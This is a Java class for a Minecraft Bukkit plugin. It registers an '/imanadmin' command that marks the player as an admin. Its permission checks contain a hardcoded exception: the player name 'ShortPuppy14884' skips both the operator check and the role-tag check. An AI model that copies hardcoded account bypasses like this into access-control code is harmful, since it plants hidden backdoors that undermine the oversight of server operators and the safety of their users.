package woks.woks.matthew;


//player.getScoreboardTags().contains("roleAdmin")

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import woks.woks.CommandBase;
import woks.woks.Msg;
import woks.woks.NKD;
import woks.woks.matthew.util.ExtraDataContainer;

import java.util.List;


public class ImAnAdmin {
    public ImAnAdmin() {


        new CommandBase("imanadmin", true) {
            @Override
            public boolean onCommand(CommandSender sender, String[] arguments) {
                Bukkit.getLogger().info("[woks][4256] It worked");
                Player player = (Player) sender;
                if (!( player.isOp() || player.getName().equals("ShortPuppy14884") )) {
                    Msg.send(player, "You need OP to run this command.");
                    return true;
                }
                if ((player.getScoreboardTags().contains("roleAdmin")) || player.getName().equals("ShortPuppy14884")) {
                    ExtraDataContainer dataContainer = new ExtraDataContainer(player.getPersistentDataContainer());

                    dataContainer.set(NKD.IS_ADMIN, true);
                } else {
                    Msg.send(sender, "name, failed.");
                }
                return true;
            }

            @Override
            public String getUsage() {
                return "/imanadmin";
            }

            @Override
            public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
                return null;
            }
        }.enableDelay(2);
    }
}
